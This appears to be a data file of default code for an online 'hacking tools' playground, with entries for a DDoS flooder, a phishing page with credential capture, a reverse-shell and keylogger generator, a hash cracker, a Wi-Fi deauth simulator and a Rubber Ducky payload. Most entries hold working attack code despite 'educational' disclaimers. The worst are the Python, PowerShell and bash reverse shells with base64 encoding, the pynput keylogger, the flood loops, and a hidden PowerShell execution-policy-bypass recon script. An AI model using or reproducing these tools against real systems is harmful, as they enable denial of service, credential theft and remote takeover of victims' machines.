tools.name: DDoS Simulator
tools.description: Educational SYN/HTTP flood demonstration with rate limiting and traffic analysis
tools.defaultCode:
# DDoS Simulator - Educational Demo
# WARNING: For authorized testing only!

import socket
import threading
import time
import random

class DDoSSimulator:
    def __init__(self, target, port, method='SYN'):
        self.target = target
        self.port = port
        self.method = method
        self.packets_sent = 0
        self.running = False
    
    def syn_flood(self):
        """Simulate SYN flood attack (demo only)"""
        print(f'[*] SYN Flood -> {self.target}:{self.port}')
        self.running = True
        while self.running:
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.settimeout(0.1)
                s.connect_ex((self.target, self.port))
                self.packets_sent += 1
                s.close()
            except: pass
            if self.packets_sent % 100 == 0:
                print(f'  Packets: {self.packets_sent}')
    
    def http_flood(self):
        """Simulate HTTP flood with random headers"""
        import http.client
        print(f'[*] HTTP Flood -> {self.target}:{self.port}')
        headers = {
            'User-Agent': random.choice([
                'Mozilla/5.0 (Windows NT 10.0; Win64; x64)',
                'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15)',
                'Mozilla/5.0 (X11; Linux x86_64)',
            ]),
            'Accept': '*/*',
            'Connection': 'keep-alive',
        }
        self.running = True
        while self.running:
            try:
                conn = http.client.HTTPConnection(self.target, self.port, timeout=2)
                conn.request('GET', '/', headers=headers)
                self.packets_sent += 1
                conn.close()
            except: pass
    
    def stop(self):
        self.running = False
        print(f'\n[*] Stopped. Total packets: {self.packets_sent}')

# Demo (do NOT use against unauthorized targets)
sim = DDoSSimulator('127.0.0.1', 80, 'SYN')
print('[!] Demo mode - targeting localhost only')
print('[*] Press Ctrl+C to stop')

tools.name: Phishing Simulator
tools.description: Login page generator and credential harvester for authorized phishing awareness testing
tools.defaultCode:
# Phishing Simulator - Educational Demo # For authorized security awareness testing ONLY from http.server import HTTPServer, BaseHTTPRequestHandler import urllib.parse import datetime PHISH_PAGE = ''' Login - Secure Portal

🔒 Secure Login

This is a phishing awareness test

''' class PhishHandler(BaseHTTPRequestHandler): def do_GET(self): self.send_response(200) self.send_header('Content-Type', 'text/html') self.end_headers() self.wfile.write(PHISH_PAGE.encode()) def do_POST(self): length = int(self.headers['Content-Length']) data = urllib.parse.parse_qs(self.rfile.read(length).decode()) email = data.get('email', [''])[0] password = data.get('password', [''])[0] timestamp = datetime.datetime.now().isoformat() print(f'[+] Credentials captured at {timestamp}') print(f' Email: {email}') print(f' Password: {"*" * len(password)} ({len(password)} chars)') # Redirect to real site self.send_response(302) self.send_header('Location', 'https://example.com') self.end_headers() # Start server print('[*] Phishing server starting on http://localhost:8888') print('[!] For authorized testing only!') server = HTTPServer(('0.0.0.0', 8888), PhishHandler) server.serve_forever()

tools.name: Virus Maker
tools.description: Reverse shell generator, keylogger demo, and payload builder for penetration testing
tools.defaultCode:
# Reverse Shell & Payload Generator
# Educational demonstration only

import sys
import base64

def generate_python_reverse(ip, port):
    payload = f'''import socket,subprocess,os
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect(("{ip}",{port}))
os.dup2(s.fileno(),0)
os.dup2(s.fileno(),1)
os.dup2(s.fileno(),2)
subprocess.call(["/bin/sh","-i"])'''
    return payload

def generate_powershell_reverse(ip, port):
    payload = f'''$c=New-Object Net.Sockets.TCPClient("{ip}",{port})
$s=$c.GetStream()
[byte[]]$b=0..65535|%{{0}}
while(($i=$s.Read($b,0,$b.Length))-ne 0){{
  $d=(New-Object Text.ASCIIEncoding).GetString($b,0,$i)
  $r=(iex $d 2>&1|Out-String)
  $sb=([text.encoding]::ASCII).GetBytes($r)
  $s.Write($sb,0,$sb.Length)
  $s.Flush()}}
$c.Close()'''
    return payload

def generate_bash_reverse(ip, port):
    return f'bash -i >& /dev/tcp/{ip}/{port} 0>&1'

def encode_payload(payload, encoding='base64'):
    if encoding == 'base64':
        return base64.b64encode(payload.encode()).decode()
    elif encoding == 'hex':
        return payload.encode().hex()
    return payload

def simple_keylogger_demo():
    """Demonstrates keylogger concept (non-functional demo)"""
    print('[*] Keylogger Demo (concept only)')
    print('[*] In a real keylogger:')
    print('  1. Hook keyboard events (SetWindowsHookEx / pynput)')
    print('  2. Log keystrokes to buffer')
    print('  3. Periodically exfiltrate logs')
    print('  4. Persist via startup registry')
    return '''# Keylogger concept (DO NOT use without authorization)
from pynput.keyboard import Key, Listener
import logging

logging.basicConfig(filename='keylog.txt', level=logging.DEBUG)

def on_press(key):
    logging.info(str(key))

with Listener(on_press=on_press) as listener:
    listener.join()'''

# Generate all payloads
ip = '10.10.10.1'
port = '4444'

print('=== Reverse Shell Payloads ===')
print(f'\n[Python]\n{generate_python_reverse(ip, port)}')
print(f'\n[PowerShell]\n{generate_powershell_reverse(ip, port)}')
print(f'\n[Bash]\n{generate_bash_reverse(ip, port)}')
print(f'\n[Base64 Encoded Python]\n{encode_payload(generate_python_reverse(ip, port))}')

tools.name: Vuln Scanner
tools.description: Nuclei-like vulnerability scanner checking CORS, headers, and common misconfigurations
tools.defaultCode:
# Vulnerability Scanner
# Nuclei-like web vulnerability checker

import requests
import ssl
import socket
from urllib.parse import urlparse

def check_cors(url):
    """Check for CORS misconfiguration"""
    print(f'\n=== CORS Check: {url} ===')
    origins = ['https://evil.com', 'null',
               url.replace('https','http')]
    for origin in origins:
        try:
            h = {'Origin': origin}
            r = requests.get(url, headers=h, timeout=5)
            acao = r.headers.get('Access-Control-Allow-Origin','')
            acac = r.headers.get('Access-Control-Allow-Credentials','')
            if acao == origin or acao == '*':
                sev = 'CRITICAL' if acac=='true' else 'HIGH'
                print(f'  [{sev}] Reflects: {origin}')
                print(f'    ACAO: {acao}, ACAC: {acac}')
        except: pass

def check_headers(url):
    """Audit security headers"""
    print(f'\n=== Security Headers: {url} ===')
    required = {
        'Strict-Transport-Security': 'HSTS',
        'Content-Security-Policy': 'CSP',
        'X-Frame-Options': 'Clickjacking',
        'X-Content-Type-Options': 'MIME sniffing',
        'Referrer-Policy': 'Referrer leakage',
        'Permissions-Policy': 'Feature control',
    }
    try:
        r = requests.get(url, timeout=5)
        present = 0
        for header, desc in required.items():
            if header in r.headers:
                print(f'  [OK] {header}: {r.headers[header][:50]}')
                present += 1
            else:
                print(f'  [MISSING] {header} - {desc}')
        score = (present/len(required))*100
        print(f'\n  Score: {score:.0f}%')
    except Exception as e:
        print(f'  Error: {e}')

def check_info_disclosure(url):
    """Check for information disclosure"""
    print(f'\n=== Info Disclosure: {url} ===')
    try:
        r = requests.get(url, timeout=5)
        for h in ['Server','X-Powered-By','X-AspNet-Version']:
            if h in r.headers:
                print(f'  [!] {h}: {r.headers[h]}')
    except: pass

def scan(url):
    print(f'[*] Scanning: {url}')
    check_cors(url)
    check_headers(url)
    check_info_disclosure(url)
    print(f'\n[*] Scan complete')

print('[*] Vuln Scanner ready')
print('[*] Usage: scan("https://target.com")')

tools.name: IP Tracker
tools.description: GeoIP lookup, WHOIS query, ASN information, and traceroute visualization
tools.defaultCode:
# IP Tracker - GeoIP, WHOIS, Traceroute

import requests
import json
import socket

def geoip_lookup(ip):
    """Get geographic location of IP"""
    print(f'\n=== GeoIP: {ip} ===')
    try:
        r = requests.get(f'http://ip-api.com/json/{ip}', timeout=5)
        data = r.json()
        if data['status'] == 'success':
            print(f'  Country: {data["country"]} ({data["countryCode"]})')
            print(f'  Region:  {data["regionName"]}')
            print(f'  City:    {data["city"]}')
            print(f'  ZIP:     {data["zip"]}')
            print(f'  Lat/Lon: {data["lat"]}, {data["lon"]}')
            print(f'  ISP:     {data["isp"]}')
            print(f'  Org:     {data["org"]}')
            print(f'  AS:      {data["as"]}')
        return data
    except Exception as e:
        print(f'  Error: {e}')

def reverse_dns(ip):
    """Reverse DNS lookup"""
    print(f'\n=== Reverse DNS: {ip} ===')
    try:
        hostname = socket.gethostbyaddr(ip)
        print(f'  Hostname: {hostname[0]}')
        print(f'  Aliases:  {hostname[1]}')
        return hostname
    except:
        print('  No reverse DNS record')

def whois_lookup(target):
    """Basic WHOIS information"""
    print(f'\n=== WHOIS: {target} ===')
    try:
        r = requests.get(f'https://whois.arin.net/rest/ip/{target}', 
                        headers={'Accept':'application/json'}, timeout=5)
        data = r.json()
        net = data.get('net', {})
        print(f'  Name: {net.get("name",{}).get("$","N/A")}')
        print(f'  Handle: {net.get("handle",{}).get("$","N/A")}')
        print(f'  CIDR: {net.get("startAddress",{}).get("$","")} - {net.get("endAddress",{}).get("$","")}')
    except:
        print('  WHOIS data unavailable (try whois CLI)')

def track(ip):
    geoip_lookup(ip)
    reverse_dns(ip)
    whois_lookup(ip)

print('[*] IP Tracker ready')
print('[*] Usage: track("8.8.8.8")')

tools.name: Password Cracker
tools.description: Hashcat/John-like interface with hash identification, wordlist generation, and brute force
tools.defaultCode:
# Password Cracker - Hash ID & Wordlist Generator

import hashlib
import itertools
import string

def identify_hash(h):
    """Identify hash type by length"""
    length = len(h)
    types = {
        32: 'MD5', 40: 'SHA-1', 64: 'SHA-256',
        128: 'SHA-512', 56: 'SHA-224', 96: 'SHA-384'
    }
    return types.get(length, f'Unknown ({length} chars)')

def dictionary_attack(hash_val, wordlist):
    """Crack hash using wordlist"""
    hash_type = identify_hash(hash_val)
    algo = {'MD5':'md5','SHA-1':'sha1','SHA-256':'sha256','SHA-512':'sha512'}
    if hash_type not in algo:
        print(f'[!] Unsupported: {hash_type}')
        return
    
    print(f'[*] Cracking {hash_type}: {hash_val[:20]}...')
    for word in wordlist:
        h = hashlib.new(algo[hash_type], word.encode()).hexdigest()
        if h == hash_val.lower():
            print(f'[+] CRACKED: {word}')
            return word
    print('[-] Not found in wordlist')

def generate_wordlist(base_words, rules=True):
    """Generate wordlist with mutations"""
    results = set(base_words)
    for word in base_words:
        results.add(word.upper())
        results.add(word.capitalize())
        results.add(word + '123')
        results.add(word + '!')
        results.add(word + '1')
        results.add(word.replace('a','@').replace('e','3').replace('o','0'))
        for y in range(2020, 2027):
            results.add(word + str(y))
    return sorted(results)

def brute_force_demo(hash_val, charset='abcdefghijklmnopqrstuvwxyz0123456789', max_len=4):
    """Brute force demo (limited length)"""
    hash_type = identify_hash(hash_val)
    print(f'[*] Brute force {hash_type} (max {max_len} chars)')
    attempts = 0
    for length in range(1, max_len + 1):
        for combo in itertools.product(charset, repeat=length):
            word = ''.join(combo)
            h = hashlib.md5(word.encode()).hexdigest()
            attempts += 1
            if h == hash_val:
                print(f'[+] CRACKED: {word} ({attempts} attempts)')
                return word
    print(f'[-] Failed after {attempts} attempts')

# Demo
test_hash = hashlib.md5(b'admin').hexdigest()
print(f'[*] Test hash (MD5 of "admin"): {test_hash}')
print(f'[*] Type: {identify_hash(test_hash)}')

base_words = ['password','admin','root','test','user','login']
wordlist = generate_wordlist(base_words)
print(f'[*] Generated wordlist: {len(wordlist)} words')
dictionary_attack(test_hash, wordlist)

tools.name: WiFi Deauth
tools.description: Monitor mode simulation, AP scanner, and deauthentication frame analysis
tools.defaultCode:
# WiFi Deauth Simulator
# Educational - shows how deauth attacks work
# Requires actual hardware + aircrack-ng for real attacks

import random
import time

class WiFiSimulator:
    def __init__(self):
        self.interface = 'wlan0mon'
        self.aps = self._generate_aps()
    
    def _generate_aps(self):
        return [
            {'bssid': 'AA:BB:CC:DD:EE:01', 'ssid': 'HomeNetwork', 'channel': 6, 'signal': -42, 'security': 'WPA2'},
            {'bssid': 'AA:BB:CC:DD:EE:02', 'ssid': 'CorpWiFi', 'channel': 11, 'signal': -55, 'security': 'WPA2-Enterprise'},
            {'bssid': 'AA:BB:CC:DD:EE:03', 'ssid': 'GuestNet', 'channel': 1, 'signal': -67, 'security': 'Open'},
            {'bssid': 'AA:BB:CC:DD:EE:04', 'ssid': 'IoT-Network', 'channel': 6, 'signal': -71, 'security': 'WEP'},
            {'bssid': 'AA:BB:CC:DD:EE:05', 'ssid': 'Hidden', 'channel': 3, 'signal': -80, 'security': 'WPA3'},
        ]
    
    def scan_aps(self):
        print(f'[*] Scanning with {self.interface}...\n')
        print(f'{"BSSID":<20} {"CH":<5} {"PWR":<6} {"ENC":<15} {"SSID"}')
        print('-' * 70)
        for ap in self.aps:
            print(f'{ap["bssid"]:<20} {ap["channel"]:<5} {ap["signal"]:<6} {ap["security"]:<15} {ap["ssid"]}')
    
    def deauth_simulation(self, target_bssid, count=10):
        target = next((a for a in self.aps if a['bssid']==target_bssid), None)
        if not target:
            print('[!] Target not found')
            return
        
        print(f'\n[*] Deauth attack simulation')
        print(f'[*] Target: {target["ssid"]} ({target_bssid})')
        print(f'[*] Sending {count} deauth frames...\n')
        
        for i in range(count):
            client = f'CC:DD:EE:FF:{random.randint(10,99)}:{random.randint(10,99)}'
            print(f'  [{i+1}] Deauth -> {client} (Reason: 7 - Class 3 received from nonassoc STA)')
            time.sleep(0.1)
        
        print(f'\n[*] Sent {count} deauth frames')
        print('[*] Clients should disconnect temporarily')
        print('[!] Real command: aireplay-ng -0 10 -a TARGET_BSSID wlan0mon')

sim = WiFiSimulator()
sim.scan_aps()
print()
sim.deauth_simulation('AA:BB:CC:DD:EE:01', 5)

tools.name: Rubber Ducky
tools.description: DuckyScript editor, compiler, 20+ payloads, and virtual keystroke execution simulator
tools.defaultCode:
REM === Windows Rubber Ducky Payload ===
REM Target: Windows 10/11
REM Action: Open PowerShell and run recon
REM Author: Educational Demo

DELAY 1000
REM Open Run Dialog
GUI r
DELAY 500
REM Launch hidden PowerShell
STRING powershell -w hidden -nop -ep bypass
ENTER
DELAY 1000
REM System information gathering
STRING $info = @{}
ENTER
STRING $info.hostname = $env:COMPUTERNAME
ENTER
STRING $info.username = $env:USERNAME
ENTER
STRING $info.domain = $env:USERDOMAIN
ENTER
STRING $info.os = (Get-WmiObject Win32_OperatingSystem).Caption
ENTER
STRING $info.ip = (Get-NetIPAddress -AddressFamily IPv4 | Where-Object {$_.InterfaceAlias -ne 'Loopback'}).IPAddress
ENTER
STRING $info | ConvertTo-Json | Out-File $env:TEMP\recon.json
ENTER
STRING Write-Host '[+] Recon complete:' $env:TEMP\recon.json
ENTER
